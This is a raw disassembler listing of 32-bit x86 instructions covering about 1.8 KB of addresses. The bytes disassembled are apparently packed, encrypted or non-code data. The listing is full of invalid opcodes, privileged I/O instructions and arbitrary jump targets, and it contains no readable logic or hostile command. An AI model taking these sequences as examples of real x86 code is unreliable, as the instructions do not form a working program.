  44b012:	stos   BYTE PTR es:[edi],al
  44b013:	push   0xffffffff
  44b015:	xchg   esi,eax
  44b016:	fisubr WORD PTR [ebx]
  44b018:	int    0x41
  44b01a:	xchg   ecx,eax
  44b01b:	mov    esi,0x8bb1ab
  44b020:	sbb    esp,DWORD PTR [eax-0x7a4dfc4f]
  44b026:	scas   eax,DWORD PTR es:[edi]
  44b027:	loope  0x44b01c
  44b029:	push   ebp
  44b02a:	dec    ecx
  44b02b:	and    cl,BYTE PTR [edi-0x2463016c]
  44b031:	test   al,0xb8
  44b033:	arpl   WORD PTR [eax+0x46f0c5b4],bx
  44b039:	dec    ecx
  44b03a:	gs pop ebp
  44b03c:	and    al,0xa5
  44b03e:	(bad)  
  44b040:	popa   
  44b041:	movlps xmm1,QWORD PTR [eax+0x27248812]
  44b048:	retf   
  44b049:	ins    DWORD PTR es:[edi],dx
  44b04a:	ret    
  44b04b:	pop    ebx
  44b04c:	push   ebp
  44b04d:	clc    
  44b04e:	mov    ah,0xc1
  44b050:	outs   dx,DWORD PTR ds:[esi]
  44b051:	mov    eax,ds:0xc1456ec0
  44b056:	push   edi
  44b057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b058:	jmp    0xfde93516
  44b05d:	out    dx,al
  44b05e:	and    DWORD PTR [edx+0x75e82392],ebx
  44b064:	test   eax,0xdfb7b26f
  44b069:	xchg   edx,eax
  44b06a:	jl     0x44b0b6
  44b06c:	push   eax
  44b06d:	scas   al,BYTE PTR es:[edi]
  44b06e:	popf   
  44b06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b070:	mov    bl,BYTE PTR [ebp+0x27adebf5]
  44b076:	ret    
  44b077:	mov    ecx,ss
  44b079:	nop
  44b07a:	sub    eax,0x9adb224f
  44b07f:	(bad)  
  44b080:	in     al,0x99
  44b082:	push   edx
  44b083:	dec    ebx
  44b084:	jl     0x44b049
  44b086:	or     edx,ebp
  44b088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b089:	(bad)  
  44b08a:	fistp  DWORD PTR [edx+0x3f2af8c8]
  44b090:	mov    ch,0x7b
  44b092:	cwde   
  44b093:	dec    esi
  44b094:	sti    
  44b095:	dec    edx
  44b096:	aad    0x1b
  44b098:	adc    DWORD PTR [edx],edx
  44b09a:	push   ds
  44b09b:	sub    al,0xf6
  44b09d:	jbe    0x44b0b0
  44b09f:	jl     0x44b067
  44b0a1:	sub    DWORD PTR ds:0x9234629f,esp
  44b0a7:	stos   DWORD PTR es:[edi],eax
  44b0a8:	pop    esp
  44b0a9:	lds    esi,FWORD PTR [ecx]
  44b0ab:	push   ebp
  44b0ac:	xor    eax,0x18ba35ac
  44b0b1:	push   ecx
  44b0b2:	mov    cl,0x24
  44b0b4:	pop    edx
  44b0b5:	jge    0x44b0ef
  44b0b7:	(bad)  
  44b0b8:	fild   QWORD PTR [eax-0x79]
  44b0bb:	and    eax,0x45cd6935
  44b0c0:	loop   0x44b0a5
  44b0c2:	push   esi
  44b0c3:	test   al,0x3f
  44b0c5:	ins    DWORD PTR es:[edi],dx
  44b0c6:	out    0xed,al
  44b0c8:	fild   WORD PTR [ebp+0x1e5906e8]
  44b0ce:	jle    0x44b090
  44b0d0:	or     ah,BYTE PTR [esi+ecx*1-0x68]
  44b0d4:	add    ah,BYTE PTR ds:0xcb41c108
  44b0da:	mov    WORD PTR [esi-0x353d4dc5],?
  44b0e0:	outs   dx,DWORD PTR ds:[esi]
  44b0e1:	and    ebp,DWORD PTR [ebx]
  44b0e3:	retf   
  44b0e4:	push   0x8d36d540
  44b0e9:	hlt    
  44b0ea:	or     dl,BYTE PTR [ecx]
  44b0ec:	add    eax,0xfbe9297b
  44b0f1:	rcr    BYTE PTR [edx],1
  44b0f3:	clc    
  44b0f4:	ret    0x86a7
  44b0f7:	pop    ecx
  44b0f8:	loop   0x44b0af
  44b0fa:	mul    DWORD PTR [esi-0x78c3d00b]
  44b100:	pushf  
  44b101:	mov    eax,ds:0xace7eb91
  44b106:	push   ecx
  44b107:	jle    0x44b0b8
  44b109:	jmp    0x590c57af
  44b10e:	lods   al,BYTE PTR ds:[esi]
  44b10f:	mov    ecx,0x5722a0fb
  44b114:	add    eax,0x8bf798f4
  44b119:	inc    edx
  44b11a:	sbb    ecx,DWORD PTR [esi-0xa00ee2e]
  44b120:	not    BYTE PTR [eax-0x6b6f1787]
  44b126:	xchg   BYTE PTR [edx+0x3a],cl
  44b129:	and    eax,0x85f34c89
  44b12e:	rcr    DWORD PTR [edx+0xef1d34b],1
  44b134:	adc    dl,al
  44b136:	mov    esp,0x4e73087f
  44b13b:	xlat   BYTE PTR ds:[ebx]
  44b13c:	cmc    
  44b13d:	ss sbb eax,0x5ff08e79
  44b143:	mov    edi,0xb48e963f
  44b148:	mov    ah,0xe8
  44b14a:	inc    edx
  44b14b:	add    ebp,DWORD PTR [esi-0x70]
  44b14e:	fiadd  DWORD PTR [edi]
  44b150:	dec    esp
  44b151:	xor    al,0x54
  44b153:	push   edx
  44b154:	popa   
  44b155:	(bad)  
  44b156:	xchg   edi,eax
  44b157:	test   DWORD PTR [esi+0x2b],esi
  44b15a:	or     cl,BYTE PTR [edi+0x5e9b2031]
  44b160:	out    0xfe,al
  44b162:	les    ecx,FWORD PTR [ebx-0x3f]
  44b165:	or     dl,ch
  44b167:	je     0x44b151
  44b169:	aam    0x62
  44b16b:	iret   
  44b16c:	gs mov edx,ecx
  44b16f:	xor    DWORD PTR [eax],ebx
  44b171:	repz fcom DWORD PTR [ebp-0x52f9fc46]
  44b178:	lods   al,BYTE PTR ds:[esi]
  44b179:	jge    0x44b1d7
  44b17b:	or     DWORD PTR [ebp-0x1e3f5fb1],0x14f6b59e
  44b185:	test   DWORD PTR [edi-0x61],0xcb8aa09
  44b18c:	jno    0x44b1c6
  44b18e:	cmp    eax,0x937f6e21
  44b193:	ja     0x44b1c4
  44b195:	push   ebx
  44b196:	and    cl,BYTE PTR [esi-0x1cae5f1]
  44b19c:	(bad)  
  44b19d:	and    al,0x14
  44b19f:	dec    eax
  44b1a0:	sbb    eax,0x1cfbd839
  44b1a5:	retf   0x2691
  44b1a8:	sbb    ecx,esp
  44b1aa:	cwde   
  44b1ab:	push   cs
  44b1ac:	mov    cl,0x8c
  44b1ae:	adc    DWORD PTR [ecx-0x90a03c8],ebp
  44b1b4:	rcr    BYTE PTR [edi-0x77],0x80
  44b1b8:	out    0x16,eax
  44b1ba:	rcr    DWORD PTR [esi-0x5b8955a9],1
  44b1c0:	and    BYTE PTR [edx],bl
  44b1c2:	(bad)
  44b1c6:	jmp    0x44b20e
  44b1c8:	xor    al,0xe5
  44b1ca:	jae    0x44b239
  44b1cc:	push   edx
  44b1cd:	and    DWORD PTR [esi],edi
  44b1cf:	in     eax,dx
  44b1d0:	add    DWORD PTR [ecx],eax
  44b1d2:	sub    DWORD PTR [ecx+eax*8+0x1467e275],edi
  44b1d9:	pushf  
  44b1da:	push   0xffffffd1
  44b1dc:	cwde   
  44b1dd:	popa   
  44b1de:	rcl    DWORD PTR [esi],0xca
  44b1e1:	push   esp
  44b1e2:	imul   ecx,DWORD PTR [ebx+0x77ce7c7f],0x6
  44b1e9:	xchg   BYTE PTR [ecx-0x2b],ch
  44b1ec:	ins    DWORD PTR es:[edi],dx
  44b1ed:	scas   al,BYTE PTR es:[edi]
  44b1ee:	and    dl,dl
  44b1f0:	imul   edi,DWORD PTR fs:[edi-0x168f5091],0x1ba322b3
  44b1fb:	push   eax
  44b1fc:	xor    ebx,DWORD PTR [esi-0x67]
  44b1ff:	inc    edx
  44b200:	call   0x1712:0x1d017446
  44b207:	out    0x83,al
  44b209:	stos   BYTE PTR es:[edi],al
  44b20a:	and    ch,BYTE PTR [edx-0x1a]
  44b20d:	inc    ebx
  44b20e:	and    ch,BYTE PTR [eax]
  44b210:	aas    
  44b211:	or     al,0xfc
  44b213:	sbb    eax,0xa652123a
  44b218:	outs   dx,DWORD PTR ds:[esi]
  44b219:	scas   al,BYTE PTR es:[edi]
  44b21a:	out    0xe3,eax
  44b21c:	(bad)  
  44b21d:	into   
  44b21e:	jb     0x44b210
  44b220:	jnp    0x44b1b5
  44b222:	ins    BYTE PTR es:[edi],dx
  44b223:	pop    edx
  44b224:	ss inc edx
  44b226:	add    DWORD PTR [edx-0x37897993],edx
  44b22c:	push   0xa
  44b22e:	xor    DWORD PTR [edx-0x7b],esi
  44b231:	aaa    
  44b232:	rcr    BYTE PTR [esi+0x19],cl
  44b235:	retf   
  44b236:	ss enter 0x6049,0x8b
  44b23b:	mov    DWORD PTR [eax+ecx*8-0x4e4833dd],edx
  44b242:	sbb    ebx,DWORD PTR [eax]
  44b244:	cmp    cl,BYTE PTR [ecx-0x5e]
  44b247:	or     al,0xcd
  44b249:	scas   eax,DWORD PTR es:[edi]
  44b24a:	add    al,0x26
  44b24c:	out    0x98,al
  44b24e:	sbb    DWORD PTR [edx+edx*4],ebp
  44b251:	jb     0x44b2b4
  44b253:	in     eax,dx
  44b254:	and    BYTE PTR [edi-0x28],bl
  44b257:	sub    BYTE PTR [ebp+edx*1+0x3b],ah
  44b25b:	aad    0xc5
  44b25d:	ss cmp al,0x20
  44b260:	into   
  44b261:	call   0xfade:0x46ce304e
  44b268:	ret    0x698a
  44b26b:	xchg   ebx,eax
  44b26c:	loope  0x44b27d
  44b26e:	mov    dh,0xcb
  44b270:	cmp    BYTE PTR [eax+edx*4-0x70],0xd7
  44b275:	aam    0x8f
  44b277:	loope  0x44b2ec
  44b279:	or     DWORD PTR [eax+edx*4],eax
  44b27c:	xchg   edi,eax
  44b27d:	fs sbb edi,ebp
  44b280:	mov    bh,0x75
  44b282:	mov    ecx,0x488d0ee1
  44b287:	jb     0x44b2c9
  44b289:	mov    dl,0x2f
  44b28b:	dec    ebx
  44b28c:	ror    BYTE PTR [edx-0x33],0xf4
  44b290:	shl    BYTE PTR [ebx],0x8a
  44b293:	nop
  44b294:	(bad)  
  44b295:	aam    0xff
  44b297:	mov    ecx,0xb2b0e0c3
  44b29c:	push   0x1e
  44b29e:	bound  edi,QWORD PTR [edi+0x6c]
  44b2a1:	ja     0x44b2bc
  44b2a3:	or     bl,BYTE PTR [ecx+eax*8-0x24]
  44b2a7:	cmp    eax,0x5cab9d39
  44b2ac:	and    eax,0x7c1e51e3
  44b2b1:	or     al,0xd
  44b2b3:	and    cl,BYTE PTR [ebx+0x2b97a2a8]
  44b2b9:	je     0x44b298
  44b2bb:	push   cs
  44b2bc:	ret    
  44b2bd:	jecxz  0x44b2e7
  44b2bf:	fsubr  st,st(7)
  44b2c1:	xor    DWORD PTR [ecx+0x58b72d90],ebp
  44b2c7:	adc    DWORD PTR ds:0xa60dd3e5,0xb60efc7c
  44b2d1:	pop    ds
  44b2d2:	pop    ss
  44b2d3:	(bad)  
  44b2d4:	aad    0x24
  44b2d6:	push   esp
  44b2d7:	ret    0x3e19
  44b2da:	add    ah,dl
  44b2dc:	test   eax,0xb3d13a07
  44b2e1:	cdq    
  44b2e2:	jg     0x44b2d9
  44b2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b2e5:	lea    ecx,[ebp-0x4387a0ac]
  44b2eb:	pop    esi
  44b2ec:	fld    TBYTE PTR [ecx+0x1254e49a]
  44b2f2:	out    dx,eax
  44b2f3:	push   ss
  44b2f4:	pop    edi
  44b2f5:	test   BYTE PTR [ebp+0x6fc9832c],dh
  44b2fb:	adc    al,0x39
  44b2fd:	mov    ds,WORD PTR [ebp-0x2cfe1c5b]
  44b303:	in     eax,dx
  44b304:	imul   edi,ebp,0xffffffe1
  44b307:	pop    edi
  44b308:	shr    bl,1
  44b30a:	jl     0x44b2ce
  44b30c:	lods   eax,DWORD PTR ds:[esi]
  44b30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b30e:	xchg   edi,eax
  44b30f:	fstp   QWORD PTR [ebp-0x75631512]
  44b315:	push   0xffffffc0
  44b317:	psubusb mm1,QWORD PTR [esi+esi*2]
  44b31b:	mov    cl,0xf6
  44b31d:	mov    si,0x5b37
  44b321:	adc    bl,BYTE PTR [edi-0x63]
  44b324:	aad    0x4
  44b326:	fisttp DWORD PTR [ebp-0x34a66a2f]
  44b32c:	inc    esi
  44b32d:	retf   0xa4f4
  44b330:	into   
  44b331:	retf   
  44b332:	push   0xba1d87aa
  44b337:	lods   al,BYTE PTR ds:[esi]
  44b338:	or     al,0xb5
  44b33a:	xchg   esi,eax
  44b33b:	sbb    eax,eax
  44b33d:	sbb    al,0x5e
  44b33f:	jge    0x44b364
  44b341:	popf   
  44b342:	inc    ebx
  44b343:	sbb    al,0xf5
  44b345:	cmp    al,0x42
  44b347:	mov    edx,0xd34b6cc0
  44b34c:	inc    ebp
  44b34d:	mov    DWORD PTR [edx-0x66],0x712a3aaf
  44b354:	loopne 0x44b34c
  44b356:	pop    ebp
  44b357:	in     al,dx
  44b358:	gs (bad) 
  44b35a:	cdq    
  44b35b:	adc    ecx,DWORD PTR [ecx+0xe]
  44b35e:	inc    edx
  44b35f:	fadd   QWORD PTR [eax-0x71b81a99]
  44b365:	sti    
  44b366:	push   0x68b21a4a
  44b36b:	jle    0x44b36a
  44b36d:	(bad)  
  44b36f:	ja     0x44b336
  44b371:	jmp    0x44b300
  44b373:	adc    BYTE PTR [edi+0x35],dl
  44b376:	call   0x5616576d
  44b37b:	sub    BYTE PTR [esi-0x41060f2f],bh
  44b381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b382:	repnz mov ah,BYTE PTR [edx]
  44b385:	add    ebx,0xb
  44b388:	mov    ebp,0x845ffbd6
  44b38d:	(bad)  
  44b38e:	cmp    eax,0x7818574d
  44b393:	mov    edx,esp
  44b395:	rcr    DWORD PTR [edi+0x4c498e36],0xe9
  44b39c:	dec    esp
  44b39d:	dec    ecx
  44b39e:	sub    DWORD PTR [eax+ecx*4+0x6d],0xfb151aaa
  44b3a6:	jno    0x44b351
  44b3a8:	adc    al,dh
  44b3aa:	test   al,0x5
  44b3ac:	cmp    ebx,DWORD PTR [ebx]
  44b3ae:	mov    al,0xf4
  44b3b0:	shl    DWORD PTR [eax+0x34800534],0xd0
  44b3b7:	dec    esp
  44b3b8:	adc    edx,DWORD PTR [ebp+0x177eecd7]
  44b3be:	call   FWORD PTR [esi+0x398e651d]
  44b3c4:	icebp  
  44b3c5:	aad    0xd3
  44b3c7:	pop    esp
  44b3c8:	adc    edi,DWORD PTR ds:0x42397e00
  44b3ce:	mul    DWORD PTR [ebx-0x378bc51f]
  44b3d4:	dec    ecx
  44b3d5:	loop   0x44b38b
  44b3d7:	out    dx,eax
  44b3d8:	int3   
  44b3d9:	jbe    0x44b438
  44b3db:	imul   ebp,DWORD PTR [esi+ebp*4-0x27],0xa7e5ae04
  44b3e3:	hlt    
  44b3e4:	je     0x44b3fb
  44b3e6:	and    eax,0xe17b3ded
  44b3eb:	and    eax,0xbb2b3d2f
  44b3f0:	or     bh,bh
  44b3f2:	xor    ebx,esp
  44b3f4:	dec    esi
  44b3f5:	push   ds
  44b3f6:	push   eax
  44b3f7:	cwde   
  44b3f8:	rcr    DWORD PTR [ecx+edi*4+0x4b],0x3
  44b3fd:	repz sar DWORD PTR [ebp+0x3c],1
  44b401:	jmp    0x44b466
  44b403:	aas    
  44b404:	pop    ss
  44b405:	stos   BYTE PTR es:[edi],al
  44b406:	sub    edi,ecx
  44b408:	test   DWORD PTR [edx+0x7c],ebx
  44b40b:	div    BYTE PTR [esi]
  44b40d:	cmc    
  44b40e:	je     0x44b424
  44b410:	leave  
  44b411:	cli    
  44b412:	cmp    eax,0x54d0a4ce
  44b417:	jmp    0xfd6264d
  44b41c:	or     eax,0xc0787d12
  44b421:	add    al,0x9c
  44b423:	nop
  44b424:	xchg   ecx,eax
  44b425:	std    
  44b426:	enter  0xc14f,0x9f
  44b42a:	stos   DWORD PTR es:[edi],eax
  44b42b:	xchg   ebp,eax
  44b42c:	push   esi
  44b42d:	jnp    0x44b468
  44b42f:	inc    eax
  44b430:	add    eax,0x5acdfd02
  44b435:	xor    bl,bh
  44b437:	bound  edi,QWORD PTR [eax+esi*8]
  44b43a:	sub    DWORD PTR [ebp+0x157a7272],0xc061f391
  44b444:	pusha  
  44b445:	xchg   esi,eax
  44b446:	cmp    BYTE PTR [eax-0x25baa76],al
  44b44c:	sbb    bh,al
  44b44e:	outs   dx,BYTE PTR ds:[esi]
  44b44f:	cmp    DWORD PTR [esi],edx
  44b451:	(bad)  
  44b452:	pop    ss
  44b453:	int    0x28
  44b455:	jle    0x44b4ae
  44b457:	sbb    BYTE PTR [eax-0x36],ah
  44b45a:	lods   al,BYTE PTR ds:[esi]
  44b45b:	cmp    ebp,DWORD PTR [esi+0xd3c2f68]
  44b461:	mov    ds:0x5bb77572,eax
  44b466:	push   ebx
  44b467:	adc    eax,0x4ca64c97
  44b46c:	xchg   esi,eax
  44b46d:	outs   dx,BYTE PTR ds:[esi]
  44b46e:	pop    ecx
  44b46f:	test   DWORD PTR [ecx+0x1c1c22d2],0x299c0d59
  44b479:	pop    ebp
  44b47a:	mov    ds:0xd94df7c8,al
  44b47f:	xchg   ebx,eax
  44b480:	test   eax,0x1975cb39
  44b485:	rcr    edi,cl
  44b487:	push   esi
  44b488:	jno    0x44b4a2
  44b48a:	sahf   
  44b48b:	xchg   esp,eax
  44b48c:	imul   edi,ebx,0x3727e418
  44b492:	dec    ebx
  44b493:	jl     0x44b4f5
  44b495:	jb     0x44b4f8
  44b497:	jg     0x44b49e
  44b499:	xchg   ebx,eax
  44b49a:	jnp    0x44b485
  44b49c:	stos   BYTE PTR es:[edi],al
  44b49d:	test   BYTE PTR [ebx-0x1c540660],cl
  44b4a3:	std    
  44b4a4:	hlt    
  44b4a5:	mov    bl,0xb6
  44b4a7:	loopne 0x44b46f
  44b4a9:	addr16 ret 0x5611
  44b4ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b4ae:	mov    dh,BYTE PTR [edx+0xc]
  44b4b1:	and    ecx,DWORD PTR [ebp-0x6b]
  44b4b4:	int3   
  44b4b5:	stos   DWORD PTR es:[edi],eax
  44b4b6:	add    al,BYTE PTR [ecx-0x64f63bc1]
  44b4bc:	dec    ecx
  44b4bd:	xchg   BYTE PTR [esi-0x2a],bl
  44b4c0:	inc    ebx
  44b4c1:	sbb    eax,0xcf549570
  44b4c6:	(bad)  
  44b4c7:	ins    DWORD PTR es:[edi],dx
  44b4c8:	adc    dh,BYTE PTR [ebp+esi*1-0x25]
  44b4cc:	idiv   BYTE PTR [edx+0x6e]
  44b4cf:	push   0xffffffd2
  44b4d1:	outs   dx,DWORD PTR ds:[esi]
  44b4d2:	ins    DWORD PTR es:[edi],dx
  44b4d3:	lea    ebx,ss:[edi]
  44b4d6:	out    dx,eax
  44b4d7:	icebp  
  44b4d8:	sub    BYTE PTR [edx],ch
  44b4da:	sbb    DWORD PTR ds:0x7b8b6fff,esi
  44b4e0:	mov    dl,0x9d
  44b4e2:	jp     0x44b514
  44b4e4:	or     eax,esi
  44b4e6:	adc    ch,BYTE PTR [edi+0x26326062]
  44b4ec:	adc    eax,0x27f28228
  44b4f1:	(bad)  
  44b4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b4f3:	lods   eax,DWORD PTR ds:[esi]
  44b4f4:	es jne 0x44b480
  44b4f7:	je     0x44b4dd
  44b4f9:	mov    ah,BYTE PTR [esi-0x6aa88761]
  44b4ff:	js     0x44b4c8
  44b501:	pop    ebx
  44b502:	out    dx,eax
  44b503:	cwde   
  44b504:	mov    edx,0xcae7ae5
  44b509:	mov    edx,DWORD PTR [ecx+ebp*4+0x5e]
  44b50d:	clc    
  44b50e:	out    dx,eax
  44b50f:	jbe    0x44b491
  44b511:	pop    ebx
  44b512:	xchg   ebx,eax
  44b513:	inc    ebp
  44b514:	test   ch,bl
  44b516:	or     eax,0x317853d8
  44b51b:	in     al,dx
  44b51c:	stos   BYTE PTR es:[edi],al
  44b51d:	cli    
  44b51e:	repz enterw 0x9640,0x50
  44b524:	xchg   esp,eax
  44b525:	mov    dl,0x78
  44b527:	imul   esi,DWORD PTR [edi+0x14],0xd984abd4
  44b52e:	les    eax,FWORD PTR [ecx+0x57]
  44b531:	sub    BYTE PTR [edi],0x58
  44b534:	ss mov esp,DWORD PTR ss:[eax]
  44b538:	out    0x10,al
  44b53a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b53c:	mov    bh,0x20
  44b53e:	out    dx,al
  44b53f:	and    edi,DWORD PTR [ebp+0x3a83718f]
  44b545:	out    0x42,eax
  44b547:	add    al,0x33
  44b549:	or     bl,0xb7
  44b54c:	mov    BYTE PTR [edx-0x74c87822],dl
  44b552:	hlt    
  44b553:	pop    ecx
  44b554:	cmp    dl,dh
  44b556:	aas    
  44b557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b558:	out    dx,al
  44b559:	push   ss
  44b55a:	jns    0x44b5a5
  44b55c:	and    dh,BYTE PTR [ecx-0x21]
  44b55f:	shl    edx,1
  44b561:	jmp    0x33c:0x61b08a25
  44b568:	xchg   eax,edx
  44b56a:	push   cs
  44b56b:	(bad)  
  44b56c:	es pushf 
  44b56e:	fcmovnb st,st(3)
  44b570:	mov    dl,0xef
  44b572:	out    dx,al
  44b573:	call   0xd2b5:0xa3cb49db
  44b57a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b57b:	or     DWORD PTR [ebx],esi
  44b57d:	mov    esi,0x95aff528
  44b582:	in     al,dx
  44b583:	dec    edi
  44b584:	loop   0x44b582
  44b586:	bound  esp,QWORD PTR [edx+0x1]
  44b589:	nop
  44b58a:	lahf   
  44b58b:	sbb    DWORD PTR [ecx+0x7868f780],eax
  44b591:	fnstsw WORD PTR [edi+0x59]
  44b594:	dec    edx
  44b595:	imul   DWORD PTR [esi]
  44b597:	int3   
  44b598:	loope  0x44b527
  44b59a:	push   ebx
  44b59b:	cld    
  44b59c:	iret   
  44b59d:	mov    ds:0xb0b17fb7,al
  44b5a2:	cdq    
  44b5a3:	push   es
  44b5a4:	dec    esi
  44b5a5:	out    0x77,al
  44b5a7:	xchg   esi,eax
  44b5a8:	sub    eax,0x8b2b3a95
  44b5ad:	out    0x9c,eax
  44b5af:	mov    ecx,0x6c42d29a
  44b5b4:	rol    DWORD PTR ds:0xffee7f00,cl
  44b5ba:	les    edx,FWORD PTR [esi-0x747166c6]
  44b5c0:	sbb    esi,DWORD PTR [ebx]
  44b5c2:	jo     0x44b635
  44b5c4:	or     al,BYTE PTR [esi+edi*2]
  44b5c7:	xchg   esi,eax
  44b5c8:	ss mov al,0x35
  44b5cb:	leave  
  44b5cc:	jl     0x44b57b
  44b5ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b5cf:	xchg   esi,eax
  44b5d0:	push   ss
  44b5d1:	pop    ebx
  44b5d2:	inc    ecx
  44b5d3:	out    dx,al
  44b5d4:	push   ebp
  44b5d5:	fdivrp st(0),st
  44b5d7:	ret    
  44b5d8:	pop    esi
  44b5d9:	mov    eax,ds:0xa4713bff
  44b5de:	pop    ebp
  44b5df:	popf   
  44b5e0:	or     esi,esi
  44b5e2:	sub    al,bl
  44b5e4:	in     al,0x50
  44b5e6:	in     eax,0x77
  44b5e8:	outs   dx,BYTE PTR ds:[esi]
  44b5e9:	mov    bl,0x30
  44b5eb:	adc    edi,DWORD PTR [eax+0x71b4b281]
  44b5f1:	fwait
  44b5f2:	jne    0x44b5f0
  44b5f4:	sti    
  44b5f5:	(bad)  
  44b5f6:	stos   BYTE PTR es:[edi],al
  44b5f7:	xor    eax,DWORD PTR [ebp+edx*1-0x44]
  44b5fb:	into   
  44b5fc:	ins    BYTE PTR es:[edi],dx
  44b5fd:	cmp    DWORD PTR [edx-0x302267c],esi
  44b603:	mov    eax,0x600bba49
  44b608:	xor    DWORD PTR [ebx+0x36b06f93],0x82a586f
  44b612:	sub    ebx,ebx
  44b614:	adc    DWORD PTR [ebp-0x35],eax
  44b617:	clc    
  44b618:	fbstp  TBYTE PTR [ecx+0x7dfb49a5]
  44b61e:	jno    0x44b5a5
  44b620:	and    dl,BYTE PTR [ebx]
  44b622:	cmp    dh,BYTE PTR [edi-0x78982219]
  44b628:	(bad)  
  44b62a:	jnp    0x44b632
  44b62c:	int3   
  44b62d:	pop    es
  44b62e:	jns    0x44b5ef
  44b630:	push   edx
  44b631:	and    al,BYTE PTR [ebp+0x564bbc4c]
  44b637:	int    0xfc
  44b639:	cs mov dl,0x46
  44b63c:	jns    0x44b608
  44b63e:	les    ebp,FWORD PTR [ecx+edx*2+0x21]
  44b642:	jmp    0x44b644
  44b644:	mov    bh,0x6
  44b646:	sbb    eax,0x65928c55
  44b64b:	aaa    
  44b64c:	push   esi
  44b64d:	push   ecx
  44b64e:	outs   dx,DWORD PTR ds:[esi]
  44b64f:	cdq    
  44b650:	xchg   ebx,eax
  44b651:	xchg   ebx,eax
  44b652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b653:	mov    ss,WORD PTR [eax+0x28a2cbf9]
  44b659:	jne    0x44b6b5
  44b65b:	inc    esi
  44b65c:	dec    ebx
  44b65d:	stos   BYTE PTR es:[edi],al
  44b65e:	fsubr  st,st(4)
  44b660:	lock out 0x41,al
  44b663:	xor    al,0xe7
  44b665:	bt     DWORD PTR [edi*2+0x29af821b],0x1b
  44b66e:	popa   
  44b66f:	imul   ebx
  44b671:	sbb    edx,ecx
  44b673:	int    0x6e
  44b675:	(bad)  
  44b676:	xchg   ebx,eax
  44b677:	cmp    ah,BYTE PTR [esi]
  44b679:	test   eax,0xd25b175d
  44b67e:	jne    0x44b610
  44b680:	in     al,dx
  44b681:	sbb    al,0xd4
  44b683:	mov    bh,0x2
  44b685:	loop   0x44b6fb
  44b687:	data16 int3 
  44b689:	mov    eax,ds:0x218c1a51
  44b68e:	fidivr DWORD PTR [esi+edx*2]
  44b691:	dec    esp
  44b692:	bound  ebx,QWORD PTR [esi-0x61189886]
  44b698:	xchg   esp,eax
  44b699:	not    BYTE PTR [edi+0x5a]
  44b69c:	hlt    
  44b69d:	mov    al,0x10
  44b69f:	mov    DWORD PTR [eax+0xa],ebx
  44b6a2:	in     eax,0x60
  44b6a4:	mov    BYTE PTR [ebx+0x4f],dl
  44b6a7:	inc    edx
  44b6a8:	sbb    al,0x80
  44b6aa:	out    dx,al
  44b6ab:	mov    cs,WORD PTR [esi+0x24]
  44b6ae:	fld    DWORD PTR [esp+ebp*1-0x2f]
  44b6b2:	mov    al,BYTE PTR [eax+0x3b]
  44b6b5:	sbb    BYTE PTR [ebx+0x64],bh
  44b6b8:	jle    0x44b64a
  44b6ba:	out    0x16,al
  44b6bc:	ret    
  44b6bd:	addr16 cs sub esi,edi
  44b6c1:	arpl   sp,bx
  44b6c3:	js     0x44b730
  44b6c5:	out    dx,al
  44b6c6:	sahf   
  44b6c7:	aad    0x53
  44b6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b6ca:	xor    DWORD PTR [ebp+ebp*4-0x54],esi
  44b6ce:	test   BYTE PTR [ebp-0x55107009],0x93
  44b6d5:	bound  edx,QWORD PTR [ecx*2+0x41717d73]
  44b6dc:	stos   BYTE PTR es:[edi],al
  44b6dd:	call   0xbdd11da7
  44b6e2:	jno    0x44b748
  44b6e4:	jecxz  0x44b69c
  44b6e6:	lods   al,BYTE PTR ds:[esi]
  44b6e7:	sub    esi,0xffffffbb
  44b6ea:	sub    ebx,DWORD PTR [eax-0x7e]
  44b6ed:	ins    BYTE PTR es:[edi],dx
  44b6ee:	popf   
  44b6ef:	test   eax,0xcc64684a
  44b6f4:	sbb    dh,0xa6
  44b6f7:	fwait
  44b6f8:	stos   BYTE PTR es:[edi],al
  44b6f9:	test   al,0x1a
  44b6fb:	call   0x9974bd74
  44b700:	in     eax,0xdb
  44b702:	sbb    BYTE PTR [ebx+0xd591031],0xfb
  44b709:	sbb    edi,DWORD PTR [esi]
  44b70b:	ins    DWORD PTR es:[edi],dx
  44b70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b70d:	dec    edx
  44b70e:	push   ebx
  44b70f:	loopne 0x44b758
  44b711:	ficom  DWORD PTR [edi]
  44b713:	add    eax,0xf6d62112
  44b718:	enter  0x7efa,0xd1
  44b71c:	mov    ds,WORD PTR [eax-0x71]
  44b71f:	push   ebx
  44b720:	cmp    eax,0xfec7ed6c
  44b725:	test   al,0x97
  44b727:	mov    esi,0x1c2b5ab7
  44b72c:	sahf   
  44b72d:	aad    0x7b
  44b72f:	imul   ebx,DWORD PTR [esi+0x8],0x7e
  44b733:	xchg   ecx,eax
  44b734:	or     eax,0x35cb6582
  44b739:	mov    dh,BYTE PTR [edi+ebx*8+0x3c]
  44b73d:	fwait
  44b73e:	and    ebx,DWORD PTR [ecx]
  44b740:	mov    ebp,0x7f988212
  44b745:	cmp    eax,0x2ac87194
  44b74a:	int    0xf6
  44b74c:	xchg   esp,eax
  44b74d:	lods   eax,DWORD PTR ds:[esi]
  44b74e:	outs   dx,DWORD PTR ds:[esi]
  44b74f:	mov    WORD PTR fs:[eax+0x3a511198],ds
  44b756:	xor    BYTE PTR [eax+0x4c7c8119],al
  44b75c:	xchg   ecx,eax
  44b75d:	and    eax,0xcd7fd912
  44b762:	dec    ebp
  44b763:	push   ebx
  44b764:	inc    eax
  44b765:	out    0x4a,eax
  44b767:	dec    ebx
  44b768:	fwait
  44b769:	test   DWORD PTR [eax+0x4e],eax
  44b76c:	sbb    BYTE PTR [ebp+0x36290b5],bh
  44b772:	jmp    0x44b6fe
